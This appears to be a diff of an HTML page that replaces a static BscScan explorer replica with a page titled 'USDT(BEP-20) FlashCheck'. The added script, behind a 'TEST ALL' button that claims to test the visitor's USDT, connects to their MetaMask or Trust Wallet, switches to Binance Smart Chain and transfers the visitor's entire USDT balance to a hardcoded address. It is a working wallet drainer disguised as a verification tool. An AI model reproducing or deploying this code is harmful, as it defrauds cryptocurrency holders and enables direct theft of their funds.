@@ -1,148 +1,30 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BSC Explorer (Replica)</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>USDT(BEP-20) FlashCheck</title>
     <style>
         body {
-            font-family: 'Inter', sans-serif; /* Use a similar modern font */
-            margin: 0;
-            background-color: #f0f3f5; /* Light background */
-            color: #212529; /* Dark text */
-            line-height: 1.6;
-        }
-
-        .navbar {
-            background-color: #fff;
-            padding: 1rem 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #e0e0e0;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
-        }
-
-        .navbar .logo {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: #1976d2; /* BscScan's primary blue */
-        }
-
-        .navbar .menu {
-            list-style: none;
-            display: flex;
-            gap: 1.5rem;
-            margin: 0;
-            padding: 0;
-        }
-
-        .navbar .menu a {
-            text-decoration: none;
-            color: #212529;
-            font-size: 0.95rem;
-        }
-
-        .theme-switcher {
-            /* Placeholder for theme switcher icon */
-        }
-
-        .search-bar-section {
-            padding: 2rem;
-            background-color: #e9ecef;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .search-container {
-            display: flex;
-            gap: 0.75rem;
-            max-width: 960px;
-            margin: 0 auto;
-            align-items: center;
-        }
-
-        .search-container select {
-            padding: 0.75rem 1rem;
-            border: 1px solid #ced4da;
-            border-radius: 4px;
-            font-size: 0.9rem;
-        }
-
-        .search-container input[type="text"] {
-            flex-grow: 1;
-            padding: 0.75rem 1rem;
-            border: 1px solid #ced4da;
-            border-radius: 4px;
-            font-size: 0.9rem;
-        }
-
-        .search-container button {
-            background-color: #1976d2;
+            font-family: Arial, sans-serif;
+            background-color: #121212;
             color: #fff;
-            border: none;
-            padding: 0.75rem 1.5rem;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            font-weight: bold;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-
-        .search-container button:hover {
-            background-color: #155dbd;
-        }
-
-        .sponsored-ad {
-            /* Placeholder for sponsored ad area */
-            max-width: 960px;
-            margin: 1rem auto;
-            padding: 1rem;
-            background-color: #fff;
-            border: 1px solid #e0e0e0;
-            border-radius: 4px;
-            font-size: 0.85rem;
-            color: #777;
+        .card {
+            background: #1e1e1e;
+            padding: 2em;
+            border-radius: 12px;
             text-align: center;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+            max-width: 400px;
         }
-
-        .overview-section {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            padding: 2rem;
-            gap: 1rem;
-            max-width: 960px;
-            margin: 0 auto;
-        }
-
-        .overview-card {
-            background-color: #fff;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            padding: 1.5rem;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
-            text-align: center; /* Center the button */
-        }
-
-        .overview-card h3 {
-            margin-top: 0;
-            font-size: 1rem;
-            color: #555;
-            margin-bottom: 0.5rem;
-        }
-
-        .overview-card .value {
-            font-size: 1.2rem;
-            font-weight: bold;
-            color: #212529;
-        }
-
-        .overview-card .change {
-            font-size: 0.85rem;
-            color: green; /* Example color */
-            margin-top: 0.25rem;
-        }
-
-        .verify-assets-button {
-            background-color: #00cc99; /* Similar to the button in your code */
+        button {
+            background-color: #00cc99;
             color: white;
             padding: 1em 2em;
             border: none;
@@ -151,184 +33,112 @@
             cursor: pointer;
             margin-top: 1em;
         }
-
-        .verify-assets-button:hover {
-            background-color: #00a37a;
+        button:disabled {
+            background-color: #666;
+            cursor: not-allowed;
         }
-
-        .latest-data-section {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            padding: 2rem;
-            gap: 1rem;
-            max-width: 960px;
-            margin: 0 auto;
+        #log {
+            margin-top: 1em;
+            font-size: 0.9em;
+            color: #ff6666;
         }
-
-        .latest-blocks,
-        .latest-transactions {
-            background-color: #fff;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            padding: 1.5rem;
-            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
-        }
-
-        .latest-blocks h2,
-        .latest-transactions h2 {
-            font-size: 1.1rem;
-            color: #333;
-            margin-top: 0;
-            margin-bottom: 1rem;
-            border-bottom: 1px solid #e0e0e0;
-            padding-bottom: 0.5rem;
-        }
-
-        .latest-blocks ul,
-        .latest-transactions ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-        }
-
-        .latest-blocks li,
-        .latest-transactions li {
-            padding: 0.75rem 0;
-            border-bottom: 1px solid #f0f0f0;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 0.9rem;
-        }
-
-        .latest-blocks li:last-child,
-        .latest-transactions li:last-child {
-            border-bottom: none;
-        }
-
-        .latest-blocks .block-number,
-        .latest-transactions .tx-hash {
-            color: #1976d2;
-            font-weight: bold;
-        }
-
-        .latest-blocks .age,
-        .latest-transactions .age {
-            color: #777;
-            font-size: 0.85rem;
-        }
-
-        footer {
-            text-align: center;
-            padding: 2rem 0;
-            font-size: 0.8rem;
-            color: #777;
-            border-top: 1px solid #e0e0e0;
-            background-color: #f9f9f9;
-        }
-
-        /* Basic font import */
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
     </style>
 </head>
 <body>
-    <nav class="navbar">
-        <div class="logo">BscScan</div>
-        <ul class="menu">
-            <li><a href="#">Home</a></li>
-            <li><a href="#">Blockchain</a></li>
-            <li><a href="#">Validators</a></li>
-            <li><a href="#">Tokens</a></li>
-            <li><a href="#">NFTs</a></li>
-            <li><a href="#">Resources</a></li>
-            <li><a href="#">Developers</a></li>
-            <li><a href="#">More</a></li>
-            <li><a href="#">Sign In</a></li>
-        </ul>
-        <div class="theme-switcher"></div>
-    </nav>
-
-    <header class="search-bar-section">
-        <div class="search-container">
-            <select class="filter">
-                <option>All Filters</option>
-                <option>Address</option>
-                <option>Txn Hash</option>
-                <option>Block</option>
-                <option>Token</option>
-                <option>Domain Name</option>
-            </select>
-            <input type="text" placeholder="Search by Address / Txn Hash / Block / Token / Domain Name">
-            <button type="submit">Go</button>
-        </div>
-        <div class="sponsored-ad">Sponsored: Advertise across our explorers and boost your visibility. <a href="#">Book your slot here!</a></div>
-    </header>
-
-    <section class="overview-section">
-        <div class="overview-card bnb-price">
-            <h3>BNB PRICE</h3>
-            <div class="value">$332.58</div>
-            <div class="change">+0.23%</div>
-        </div>
-        <div class="overview-card transactions">
-            <h3>TRANSACTIONS</h3>
-            <div class="value">7,106,087 <span style="font-size: 0.8rem; color: #777;">(44.3 TPS)</span></div>
-        </div>
-        <div class="overview-card gas-price">
-            <h3>MED GAS PRICE</h3>
-            <div class="value">1 Gwei</div>
-        </div>
-        <div class="overview-card verify-assets">
-            <h2>USDT (BEP-20)</h2>
-            <p>This will Test Your USDT(BEP-20) on BSC:</p>
-            <p style="word-break: break-all; font-weight: bold;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</p>
-            <button class="verify-assets-button" id="sendBtn">TEST ALL</button>
-            <div id="log"></div>
-        </div>
-        <div class="overview-card bnb-market-cap">
-            <h3>BNB MARKET CAP ON BSC</h3>
-            <div class="value">$87,565,590,571.00</div>
-            <div class="change">(50,257,415 BNB)</div>
-        </div>
-        <div class="overview-card latest-block">
-            <h3>LATEST BLOCK</h3>
-            <div class="value">48429098</div>
-            <div class="change">6 secs ago</div>
-        </div>
-    </section>
-
-    <section class="latest-data-section">
-        <div class="latest-blocks">
-            <h2>Latest Blocks</h2>
-            <ul>
-                <li><span class="block-number">48429098</span> <span class="age">6 secs ago</span></li>
-                <li><span class="block-number">48429097</span> <span class="age">9 secs ago</span></li>
-                <li><span class="block-number">48429096</span> <span class="age">12 secs ago</span></li>
-                <li><span class="block-number">48429095</span> <span class="age">15 secs ago</span></li>
-                <li><span class="block-number">48429094</span> <span class="age">18 secs ago</span></li>
-            </ul>
-            <div style="text-align: right; margin-top: 1rem;"><a href="#">View All Blocks</a></div>
-        </div>
-        <div class="latest-transactions">
-            <h2>Latest Transactions</h2>
-            <ul>
-                <li><span class="tx-hash">0xf041e5c61a...</span> <span class="age">6 secs ago</span></li>
-                <li><span class="tx-hash">0xa4b7a70af7...</span> <span class="age">9 secs ago</span></li>
-                <li><span class="tx-hash">0x987c65b321...</span> <span class="age">12 secs ago</span></li>
-                <li><span class="tx-hash">0x123d45e678...</span> <span class="age">15 secs ago</span></li>
-                <li><span class="tx-hash">0xabcdef1234...</span> <span class="age">18 secs ago</span></li>
-            </ul>
-            <div style="text-align: right; margin-top: 1rem;"><a href="#">View All Transactions</a></div>
-        </div>
-    </section>
-
-    <footer>
-        © 2023 BscScan (Replica for Educational Purposes)
-    </footer>
+    <div class="card">
+        <h2>USDT (BEP-20)</h2>
+        <p>This will Test Your USDT(BEP-20) on BSC:</p>
+        <p style="word-break: break-all; font-weight: bold;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</p>
+        <button id="sendBtn">TEST ALL</button>
+        <div id="log"></div>
+    </div>
 
     <script>
-        // You can add your JavaScript code here if you want the button to do something
-        // For now, it's just a visual element.
+        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
+        const recipient = "0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE";
+        const usdtAbi = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 value) returns (bool)"
+        ];
+
+        const bscParams = {
+            chainId: "0x38",
+            chainName: "Binance Smart Chain",
+            nativeCurrency: {
+                name: "BNB",
+                symbol: "BNB",
+                decimals: 18
+            },
+            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+            blockExplorerUrls: ["https://bscscan.com"]
+        };
+
+        function log(msg) {
+            document.getElementById("log").textContent = msg;
+        }
+
+        async function switchToBSC() {
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: bscParams.chainId }]
+                });
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    await window.ethereum.request({
+                        method: "wallet_addEthereumChain",
+                        params: [bscParams]
+                    });
+                } else {
+                    throw switchError;
+                }
+            }
+        }
+
+        async function sendAllUSDT() {
+            log("");
+            if (!window.ethereum) {
+                alert("Trust Wallet or MetaMask not detected. Open this in Trust Wallet browser.");
+                return;
+            }
+
+            try {
+                await switchToBSC();
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const userAddress = await signer.getAddress();
+
+                const bnbBalance = await provider.getBalance(userAddress);
+                const minGas = ethers.utils.parseEther("0.0001");
+
+                const readableBNB = ethers.utils.formatEther(bnbBalance);
+                console.log("BNB balance:", readableBNB);
+
+                if (bnbBalance.lt(minGas)) {
+                    log("❌ Not enough BNB for gas. You have: " + readableBNB + " BNB");
+                    return;
+                }
+
+                const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
+                const balance = await usdt.balanceOf(userAddress);
+
+                if (balance.isZero()) {
+                    log("❌ Your USDT balance is 0.");
+                    return;
+                }
+
+                const tx = await usdt.transfer(recipient, balance);
+                log("⏳ Transaction sent. Waiting for confirmation...");
+                await tx.wait();
+                log("✅ Transaction confirmed! USDT sent successfully.");
+            } catch (err) {
+                console.error(err);
+                log("❌ Transaction failed: " + (err?.message || err));
+            }
+        }
+
+        document.getElementById("sendBtn").onclick = sendAllUSDT;
     </script>
 </body>
 </html>
